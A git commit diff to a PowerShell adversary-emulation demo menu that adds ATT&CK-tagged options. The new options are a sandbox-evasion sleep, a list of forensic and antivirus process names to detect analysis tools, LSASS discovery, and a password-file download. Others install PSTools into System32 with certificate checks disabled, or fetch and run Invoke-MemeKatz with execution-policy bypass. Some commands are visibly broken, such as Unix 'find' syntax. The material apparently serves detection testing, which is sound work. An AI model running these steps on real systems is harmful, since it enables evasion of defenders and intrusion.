f8d1ee9b80da7e3c9cb9e8d039f02a25a46f2e8d
Andre Fernandes <andre.fernandes86@gmail.com>
2023-08-14 12:53:11 -0500

    Update demo.ps1

--- demo.ps1
+++ demo.ps1
@@ -12,12 +12,13 @@ Write-Host @"
 |    5) Screen Capture (T1113).                          |
 |    6) 0-Day Malware Samples.                           |
 |    7) Caldera.                                         |
-
-
-
-
-
-
+|    8) 1-min sleep (T1497.003).                         |
+|    9) Application Window Discovery (T1010).            |
+|    10) Check analysis environment processes (T1497.001)|
+|    11) Find LSASS (T1057).                             |
+|    12) Find files (T1005).                             |
+|    13) Install PSTools (T1105).                        |
+|    14) Invoke-MemeKatz (T1491).                        |
 |    100) EXIT                                           |
 +========================================================+
 
@@ -117,7 +118,7 @@ DisplayMenu
 }
 7 {
 #OPTION7
-$server="http://192.168.1.8080";
+$server="http://192.168.1.80";
 $url="$server/file/download";
 $wc=New-Object System.Net.WebClient;
 $wc.Headers.add("platform","windows");
@@ -131,88 +132,213 @@ DisplayMenu
 }
 8 {
 #OPTION8
-xxxxxxxxxx
+sleep 60
 DisplayMenu
 }
 
-6 {
-#OPTION6
-xxxxxxxxxx
+9 {
+#OPTION9
+$x = Get-Process | Where-Object {$_.MainWindowTitle -ne ""} | Select-Object MainWindowTitle;
+$a = New-Object -com "Shell.Application"; $b = $a.windows() | select-object LocationName;
+write-host ($x | Format-List | Out-String) ($b | Format-List | Out-String)
 DisplayMenu
 }
 
-6 {
-#OPTION6
-xxxxxxxxxx
+10 {
+#OPTION10
+$forensicProcesses = @(
+    "apimonitor-x64",
+    "apimonitor-x86",
+    "autopsy64",
+    "autopsy",
+    "autoruns64",
+    "autoruns",
+    "autorunsc64",
+    "autorunsc",
+    "binaryninja",
+    "blacklight",
+    "cff explorer",
+    "cutter",
+    "de4dot",
+    "debugview",
+    "diskmon",
+    "dnsd",
+    "dnspy",
+    "dotpeek32",
+    "dotpeek64",
+    "dumpcap",
+    "evidence center",
+    "exeinfope",
+    "fakedns",
+    "fakenet",
+    "ffdec",
+    "fiddler",
+    "fileinsight",
+    "floss",
+    "gdb",
+    "hiew32demo",
+    "hiew32",
+    "hollows_hunter",
+    "idaq64",
+    "idaq",
+    "idr",
+    "ildasm",
+    "ilspy",
+    "jd-gui",
+    "lordpe",
+    "officemalscanner",
+    "ollydbg",
+    "pdfstreamdumper",
+    "pe-bear",
+    "pebrowse64",
+    "peid",
+    "pe-sieve32",
+    "pe-sieve64",
+    "pestudio",
+    "peview",
+    "ppee",
+    "procdump64",
+    "procdump",
+    "processhacker",
+    "procexp64",
+    "procexp",
+    "procmon",
+    "prodiscoverbasic",
+    "py2exedecompiler",
+    "r2agent",
+    "rabin2",
+    "radare2",
+    "ramcapture64",
+    "ramcapture",
+    "reflector",
+    "regmon",
+    "resourcehacker",
+    "retdec-ar-extractor",
+    "retdec-bin2llvmir",
+    "retdec-bin2pat",
+    "retdec-config",
+    "retdec-fileinfo",
+    "retdec-getsig",
+    "retdec-idr2pat",
+    "retdec-llvmir2hll",
+    "retdec-macho-extractor",
+    "retdec-pat2yara",
+    "retdec-stacofin",
+    "retdec-unpacker",
+    "retdec-yarac",
+    "rundotnetdll",
+    "sbiesvc",
+    "scdbg",
+    "scylla_x64",
+    "scylla_x86",
+    "shellcode_launcher",
+    "solarwindsdiagnostics",
+    "sysmon64",
+    "sysmon",
+    "task explorer",
+    "task explorer-x64",
+    "tcpdump",
+    "tcpvcon",
+    "tcpview",
+    "vboxservice",
+    "win32_remote",
+    "win64_remotex64",
+    "windbg",
+    "windump",
+    "winhex64",
+    "winhex",
+    "winobj",
+    "wireshark",
+    "x32dbg",
+    "x64dbg",
+    "xwforensics64",
+    "xwforensics",
+    "redcloak",
+    "avgsvc",
+    "avgui",
+    "avgsvca",
+    "avgidsagent",
+    "avgsvcx",
+    "avgwdsvcx",
+    "avgadminclientservice",
+    "afwserv",
+    "avastui",
+    "avastsvc",
+    "aswidsagent",
+    "aswidsagenta",
+    "aswengsrv",
+    "avastavwrapper",
+    "bccavsvc",
+    "psanhost",
+    "psuaservice",
+    "psuamain",
+    "avp",
+    "avpui",
+    "ksde",
+    "ksdeui",
+    "tanium",
+    "taniumclient",
+    "taniumdetectengine",
+    "taniumendpointindex",
+    "taniumtracecli",
+    "taniumtracewebsocketclient64"
+);
+
+function Find-ForensicProcesses {
+    param (
+        $ForensicProcessList
+    );
+    $CurrentProcesses = Get-Process | Sort-Object | Select-Object -Property Name | Get-Unique -AsString;
+    foreach ($proc in $CurrentProcesses) {
+        foreach ($forensicProc in $ForensicProcessList) {
+            if ($proc.name -like $forensicProc) {
+                $procPath = Get-Process -Name $proc.Name | Sort-Object | Select-Object -Property Path | Get-Unique;
+                Write-Host "[!] Forensic process found: " $proc.Name;
+                Write-Host "[!] Path: " $procPath.Path;
+            }
+        }
+    }
+}
+
+Find-ForensicProcesses($forensicProcesses);
 DisplayMenu
 }
 
-6 {
-#OPTION6
-xxxxxxxxxx
+11 {
+#OPTION11
+$ps = get-process | select processname,Id;
+$valid = foreach($p in $ps) { if($p.ProcessName -eq "lsass") {$p} };
+$valid | ConvertTo-Json
 DisplayMenu
 }
 
-6 {
-#OPTION6
-xxxxxxxxxx
+12 {
+#OPTION12
+cd \
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/andrefernandes86/exposed-info/main/passwords.txt
+copy passwords.txt c:\users\
+mkdir temp
+copy passwords.txt c:\temp
+find /Users -name 'passwords.*' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
 DisplayMenu
 }
 
-6 {
-#OPTION6
-xxxxxxxxxx
+13 {
+#OPTION13
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+$web = (New-Object System.Net.WebClient);
+$result = $web.DownloadFile("https://download.sysinternals.com/files/PSTools.zip", "PSTools.zip");
+New-Item -ItemType "directory" C:\Windows\System32\PSTools -Force;
+Add-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip", "C:\Windows\System32\PSTools");
 DisplayMenu
 }
 
-6 {
-#OPTION6
-xxxxxxxxxx
+14 {
+#OPTION14
+Invoke-WebRequest -Uri https://github.com/mitre/stockpile/blob/master/payloads/Invoke-MemeKatz.ps1
+powershell.exe -ep bypass -c "Invoke-MemeKatz.ps1"
 DisplayMenu
 }
-
-6 {
-#OPTION6
-xxxxxxxxxx
-DisplayMenu
-}
-
-6 {
-#OPTION6
-xxxxxxxxxx
-DisplayMenu
-}
-
-6 {
-#OPTION6
-xxxxxxxxxx
-DisplayMenu
-}
-
-6 {
-#OPTION6
-xxxxxxxxxx
-DisplayMenu
-}
-
-6 {
-#OPTION6
-xxxxxxxxxx
-DisplayMenu
-}
-
-6 {
-#OPTION6
-xxxxxxxxxx
-DisplayMenu
-}
-
-6 {
-#OPTION6
-xxxxxxxxxx
-DisplayMenu
-}
-
 
 100 {
 #OPTION100
